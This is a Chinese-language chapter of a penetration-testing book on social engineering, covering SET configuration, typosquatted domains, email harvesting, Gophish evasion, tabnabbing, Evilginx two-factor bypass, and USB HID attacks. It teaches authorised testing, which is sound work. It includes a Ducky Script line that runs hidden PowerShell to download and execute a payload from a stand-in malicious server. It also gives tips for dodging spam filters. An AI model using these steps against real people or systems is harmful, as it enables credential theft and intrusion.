# 第 8 章：社会工程学

安全领域的许多人认为，社会工程学（即通过钓鱼邮件、欺诈网站等手段欺骗用户的行为）对组织构成最大的风险之一，因为防范人为错误极其困难。本章将介绍几种工具，你可以用它们来自动化各种社会工程学攻击——前提是这些攻击在你的渗透测试范围内。

我们将使用 Social-Engineer Toolkit（SET），该工具由本书作者之一 David Kennedy 编写。SET 是最早填补渗透测试社区空白并引起人们对社会工程学攻击关注的工具包之一，下载量超过一百万次。SET 根据攻击向量（即用于获取信息或访问系统的途径，如网页、邮件、USB 等）对攻击进行分类，并大量使用了 Metasploit 框架。

此外，我们还将使用 Zphisher、Gophish、Evilginx 和 Evilgophish 等其他工具来补充 SET。这些工具层层递进：Zphisher 是一个用于执行钓鱼攻击的命令行工具，它自动化了 SMTP 消息交换和设置外部代理的过程，从而绕过 NAT 后面运行钓鱼服务器的限制。Gophish 实现了类似的功能，但提供了一个图形界面，允许渗透测试人员构建、发送和跟踪钓鱼邮件。Evilginx 是 Gophish 的绝佳补充；它允许渗透测试人员通过中间人攻击或“怪物中间人”攻击绕过双因素认证。Evilgophish 将 Evilginx 和 Gophish 合并为一个工具。

## 更新和配置 Social-Engineer Toolkit

在 Kali Linux 中，SET 安装在 `/usr/share/set/` 下。在开始使用该工具包之前，请确保你运行的是最新版本：

```bash
kali@kali:~$ sudo apt update
```

你可以使用“bleeding edge”仓库来获取最新版本：

```bash
kali@kali:~$ sudo tee /etc/apt/sources.list.d/kali-bleeding-edge.list <<END
deb http://http.kali.org/kali kali-bleeding-edge main contrib non-free
END

kali@kali:~$ sudo apt update
```

接下来，在 Kali 中进行升级：

```bash
kali@kali:~$ sudo apt upgrade
```

现在你必须更新 SET 的配置文件 `/usr/share/set/set.config`。首先，通过设置 `BLEEDING_EDGE=ON` 来启用“bleeding edge”仓库。当使用 SET 的基于 Web 的攻击向量时，你可能还想打开 `WEBATTACK_EMAIL` 标志，以便在进行 Web 攻击的同时执行邮件钓鱼。该标志默认是关闭的：

```
METASPLOIT_PATH=/usr/share/metasploit-framework/

WEBATTACK_EMAIL=ON
```

最重要的标志之一 `AUTO_DETECT` 默认是开启的。它告诉 SET 自动检测你的本地 IP 地址，并将其用作所有反向连接和 Web 服务器的地址。如果你使用多个接口，或者你的反向 payload 监听器位于不同位置，请关闭此标志：

```
AUTO_DETECT=OFF
```

然后 SET 将允许你在各种场景（例如涉及 NAT 和端口转发的场景）中指定合适的 IP 地址方案。

该工具包默认使用内置的基于 Python 的 Web 服务器。为了优化性能，将 `APACHE_SERVER` 标志设为 `ON`，SET 将使用 Apache 进行攻击：

```
APACHE_SERVER=ON
```

以上就是配置文件的基础内容。正如你所见，根据工具中设置的标志不同，SET 的行为会有显著变化。现在让我们运行该工具。

## 鱼叉式钓鱼攻击

鱼叉式钓鱼攻击向量允许你使用特制的文件格式漏洞（例如 Adobe PDF 漏洞或恶意的 Word 文档）来针对特定个人，诱骗他们打开附件，从而入侵目标机器。为了练习使用这种攻击向量，让我们以一个针对虚构组织 Company XYZ 的渗透测试为例进行演示。

### 设置邮件服务器

首先，我们必须设置一个用来发送钓鱼邮件的邮件服务器。邮件需要看起来像是真的来自 Company XYZ，因此你可以注册一个与该组织域名相似的域名，例如 `coompanyxyz.com` 或 `coom.panyXYZ.com`。这种技术称为“域名抢占”（squatting）。URLCrazy 工具可以自动搜索域名的抢占候选。以下是针对 `companyxyz.com` 的一些候选：

```bash
kali@kali:~$ sudo apt install urlcrazy
kali@kali:~$ urlcrazy -r companyxyz.com

Character Omission                   cmpanyxyz.com
Character Omission                   companyxyz.com
Character Omission                   companyxyz.com
Character Omission                   companyxyz.com
...
```

接下来，设置 SMTP 服务器并注册你抢占的域名。具体细节超出了本书范围，但你可以使用免费的 OpenSMTPD 软件。配置证书并启用 DKIM 和 DMARC 邮件认证方法将使你的服务器看起来更真实。OpenSMTPD 团队维护了一个维基页面，详细介绍了如何配置服务器以启用这些功能，地址为：https://github.com/OpenSMTPD/OpenSMTPD/wiki/How-to-build-your-own-mail-server。

设置好服务器后，你需要一个目标邮件地址列表。我们将使用一个名为 theHarvester 的工具来搜索与目标域名关联的邮件地址。该工具预装在 Kali 中，但你也可以克隆仓库来获取最新版本：

```bash
kali@kali:~$ git clone https://github.com/laramies/theHarvester.git
kali@kali:~$ cd theHarvester
kali@kali:~$ sudo python ./theHarvester.py -d target.com
```

要执行钓鱼攻击，你还需要安装 sendmail，这是 SET 用来与我们将使用的 SMTP 服务器交互的程序：

```bash
kali@kali:~$ sudo apt install sendmail
```

如果你不想自己搭建邮件服务器，可以使用你的 Gmail 账户。但是，使用 Gmail 有一些限制。特别是，你可能需要禁用其部分安全功能。

## 使用 Gophish 进行钓鱼

随着社会工程学意识的普及，黑客开发了新的钓鱼工具。Jordan Wright 开发的 Gophish 包含了许多对专业渗透测试人员有用的功能。因为 Gophish 使用图形界面而非命令行，操作相对直观，所以我们这里不再完整演示，但本节应该能帮助你入门。

要设置 Gophish，请从 GitHub 页面下载工具：https://github.com/gophish/gophish/releases。解压并将 Gophish 保存到你的 Kali 桌面。然后，打开终端，进入 gophish 文件夹，并通过运行以下命令使文件可执行：

```bash
kali@kali:/Desktop/gophish$ chmod +x gophish
kali@kali:/Desktop/gophish$ ./gophish
```

在浏览器中打开日志输出中的链接。使用默认用户名和密码登录 Gophish 门户。Gophish 用户界面应该会出现。

为了有效使用 Gophish，你需要运用一些技巧来避免被检测和规避垃圾邮件过滤器。例如，某些过滤器可能会检查 Gophish 的默认配置值。幸运的是，使用开源工具的一个好处是你可以修改它们。为了保持隐蔽，尝试更改 `/gophish/config/config.go` 配置文件中的默认服务器名称。如果 Kali 中没有 `config.go`，你可能需要从源码重新构建工具以进行修改：https://github.com/gophish/user-guide/blob/master/installation.md。

更改服务器名称只是修改 Gophish 以避免检测的众多方法之一。Sprocket Security 团队创建了一系列使 Gophish 更隐蔽的方法，记录在他们的文章《Never Had a Bad Day Phishing: How to Set Up Gophish to Evade Security Controls》中（https://www.sprocketsecurity.com/resources/never-had-a-bad-day-phishing-how-to-set-up-gophish-to-evade-security-controls）。当垃圾邮件过滤器最终赶上这些规避技术时，快速谷歌搜索应该会显示几个新的结果。

## Web 攻击

一个有效的社会工程学攻击必须对目标看起来像可信的 Web 流量。SET 和其他工具包可以克隆网站，以创建与可信网站外观相同的欺诈页面。随着时间的推移，防御者通过在登录页面和查询字符串参数中嵌入唯一的会话密钥，使得自动克隆现有网站变得更加困难。作为回应，渗透测试人员手动伪造了这些页面，一旦用户输入凭据，这些页面就会重定向到原始页面。让我们探索一些工具。

### 用户名和密码收割

### 标签页绑架（Tabnabbing）

标签页绑架发生在目标在浏览器中打开多个标签页并访问了一个恶意网站时。当目标点击你的链接时，他们会看到一个“页面加载中，请稍候”的消息。他们很可能会在页面加载时切换到其他标签页。然后，网站可以检测到另一个标签页被激活，并将页面重写为你指定的任何网站的外观。

最终，目标会返回到被绑架的标签页，通常没有意识到他们是从一个可疑链接加载该标签页的。他们以为自己被要求登录电子邮件程序或业务应用程序，于是会在恶意的仿冒网站上输入凭据。此时，你可以收割这些凭据，并将目标重定向到原始网站。你可以通过 SET 的“Web Attack Vectors”界面访问标签页绑架攻击。

### 绕过双因素认证

随着公司越来越多地采用双因素认证，仅捕获用户名和密码通常不足以绕过网站的登录过程。对我们来说幸运的是，可以使用中间人攻击或“怪物中间人”攻击来绕过双因素认证。这种攻击将流量通过攻击者的服务器路由，在转发流量到目的地之前捕获凭据。

考虑以下示例，如图 8-1 所示：攻击者注册了域名抢占 `linkedim.com`，并设置了一个服务器，将该域名的所有流量转发到合法站点 `linkedin.com`。

*图 8-1：Evilginx 如何绕过双因素认证*

当目标在钓鱼邮件中点击抢占域名的链接时，攻击者的服务器会将 Web 请求转发到真实的 LinkedIn 页面。来自真实服务器的响应将通过攻击者的服务器发回给目标。

因此，当用户在攻击者的服务器上输入凭据时，服务器会捕获用户的凭据并将其转发给真实服务器。然后，真实服务器会提示用户进行双因素认证，攻击者的服务器将响应转发给用户。一旦用户认证通过，攻击者服务器就会捕获 `linkedin.com` 的会话 cookie。现在攻击者可以登录 LinkedIn，从而绕过双因素认证。

Evilginx 工具允许你轻松执行这种攻击。你可以从 https://github.com/kretzky/evilginx2 下载 Evilginx。Evilgophish 结合了 Evilginx 和 Gophish 的功能，是进行专业钓鱼渗透测试的绝佳方式。你可以从 https://github.com/fin3ss3g0d/evilgophish 下载 Evilgophish。

## 感染性媒体生成攻击

SET 中的感染性媒体生成器是一种相对简单的攻击向量。它允许你创建一个文件夹，你可以将其刻录到 CD 或 DVD，或者存储在 USB 驱动器上。一旦插入目标机器，驱动器将运行 `autorun.inf` 文件来执行你指定的任何操作。目前，SET 支持可执行文件（如 Meterpreter）以及文件格式漏洞（如 Adobe 漏洞）。

Windows 已禁用 USB 的自动运行功能（但 DVD 和 CD 仍可使用）。我们可以使用 USB 人机接口设备（HID）攻击向量来绕过这种保护，该向量可以模拟用户输入设备。通过模拟键盘或鼠标，我们可以绕过许多防御措施。如果自动运行被禁用，你可以插入使用 USB HID 的设备，系统会将其检测为键盘。使用微处理器和板载闪存存储，你可以向目标机器发送非常快速的击键序列，从而完全入侵它，无论自动运行状态如何。

SET 是最早为 USB HID 生成脚本的框架之一。现在市场上有多种 USB HID，包括 USB Rubber Ducky、Bash Bunny、O.MG Plug 和 O.MG Cable。你可以从 https://shop.hak5.org 订购这些设备。例如，USB Rubber Ducky 是一种伪装成 USB 驱动器的可编程 USB HID。Rubber Ducky 运行一种称为 Ducky Script 的脚本语言，可自动执行按键操作。

让我们看一个 Ducky Script 示例。以下示例打开 PowerShell 并运行一个 payload。Hak5 提供了一个名为 Payload Studio 的在线编辑器，你可以用它来跟进：

```log
REM Title: Example Ducky Script
REM Props to Hak5 team
DELAY 1000
GUI r
DELAY 100
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://malicious.server/payload.ps1');"
ENTER
```

`REM` 关键字指定注释。这里，我们使用注释添加标题并向 Hak5 团队致敬。接下来，我们指定 `DELAY`，告诉 HID 在执行脚本前等待一秒钟。这给了系统时间来识别和设置设备。`GUI` 关键字代表 Windows 机器上的 Windows 键，`GUI r` 命令同时按下 Windows 键和 R 键，这将打开 Windows 运行命令窗口。

然后我们延迟 100 毫秒，并使用 `STRING` 输入一个命令，该命令打开 PowerShell 并执行引号内的所有内容。这里的 `IEX` 是 PowerShell 的 Invoke-Expression 命令，它会将字符串当作直接输入 PowerShell 的命令来执行。这尤其隐蔽，因为 `IEX` 命令在内存中执行。命令的后半部分从远程服务器下载一个 PowerShell 脚本。最后，`ENTER` 按下回车键，执行该字符串，并关闭运行命令窗口。你可以在 Hak5 的 GitHub 仓库中找到多个 Ducky Script 示例。

Bash Bunny 是另一个很棒的 USB HID。这台迷你 Linux 计算机可以同时模拟多个 USB 设备，包括网络和存储设备。Bash Bunny 也运行 Ducky Script，你可以在 Hak5 的 GitHub 仓库中找到它的 payload。除其他攻击外，它还可以暴力破解密码、捕获登录击键、创建伪造的 Windows 登录屏幕以及毒化本地 DNS 服务器。

到目前为止，我们讨论的都是针对台式机、笔记本电脑和服务器的 USB HID，但 HID 也可以用于攻击移动设备。O.MG Cable 看起来与 Android 或 iOS 设备使用的充电线完全一样。然而，它包含一个内置微控制器，运行一种几乎与 Ducky Script 相同的语言。这意味着你可以对 O.MG Cable 进行编程，例如，当目标将电缆插入移动设备时执行一个恶意的 APK 文件。你可以在 Hak5 的 GitHub 仓库中找到一系列脚本，包括执行上述攻击的脚本。

## 总结

随着组织和服务提供商通过软件和硬件解决方案更好地保护其网络边界，我们不应忘记通过电子邮件诱骗用户点击某些东西是多么容易。社会工程学攻击呈上升趋势，因此任何全面的安全程序都必须正确测试这些攻击向量。

社会工程学总体上需要技巧和实践。优秀的攻击者会精心设计他们的攻击，以针对公司用户意识计划或系统中的弱点。花几天时间研究一个组织，查看 Facebook 或 X 页面，并确定什么能触发某人点击。像 SET 这样的工具将帮助你攻击目标，但如果你失败了，很可能是因为你不够有创意。
